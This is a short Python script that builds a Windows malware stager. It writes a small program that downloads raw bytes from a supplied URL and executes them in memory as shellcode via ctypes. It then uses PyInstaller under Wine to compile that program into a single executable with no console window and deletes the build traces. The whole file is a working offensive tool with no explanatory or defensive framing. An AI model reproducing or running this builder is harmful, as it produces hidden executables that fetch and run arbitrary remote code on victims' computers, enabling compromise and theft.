#!/usr/bin/python
from sys import argv
import commands

outputfile = argv[1]
url = argv[2]

buildscript = open('/root/.wine/drive_c/Python26/pyinstaller/bindshell.py','w')
buildscript.write('#!/usr/bin/python')
buildscript.write('\nfrom ctypes import *')
buildscript.write('\nfrom urllib import urlopen')
buildscript.write('\n\nurl = \"%s\"' % url)
buildscript.write('\ndownloader = urlopen(url)')
buildscript.write('\nvamos = downloader.read()')
buildscript.write('\narray = create_string_buffer(vamos, len(vamos))')
buildscript.write('\nshell = cast(array, CFUNCTYPE(c_void_p))')
buildscript.write('\nshell()')
buildscript.close()

commands.getoutput('wine /root/.wine/drive_c/Python26/python.exe /root/.wine/drive_c/Python26/pyinstaller/Configure.py')
commands.getoutput('wine /root/.wine/drive_c/Python26/python.exe /root/.wine/drive_c/Python26/pyinstaller/Makespec.py --onefile --noconsole /root/.wine/drive_c/Python26/pyinstaller/bindshell.py')
commands.getoutput('wine /root/.wine/drive_c/Python26/python.exe /root/.wine/drive_c/Python26/pyinstaller/Build.py ./bindshell.spec')
commands.getoutput('rm bindshell.spec; rm log*; mv dist/bindshell.exe ./' + outputfile + ' ; rm dist/ build/ -r; rm warn*')
commands.getoutput('rm /root/.wine/drive_c/Python26/pyinstaller/bindshell.py')
